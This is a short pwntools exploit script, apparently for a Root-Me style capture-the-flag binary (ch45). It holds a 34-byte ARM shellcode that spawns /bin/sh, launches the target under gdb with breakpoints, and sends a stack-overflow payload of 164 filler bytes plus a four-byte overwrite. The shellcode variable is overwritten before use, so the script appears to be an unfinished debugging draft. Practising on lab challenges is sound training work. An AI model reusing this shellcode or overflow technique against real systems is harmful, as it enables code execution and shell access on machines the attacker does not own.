import pwn


from pwn import *

# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "/challenge/app-systeme/ch45/./ch45"
binary = ELF("/challenge/app-systeme/ch45/./ch45")

#34 bytes
payload = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'

#p = process("/challenge/app-systeme/ch45/./ch45")
p = gdb.debug("/challenge/app-systeme/ch45/./ch45", '''
ni
ni
ni
ni
ni
break *main+256''')

p.recvuntil('dump:')

payload = ''
payload += 'A' * 164
payload += 'B' * 4
p.sendline(payload)
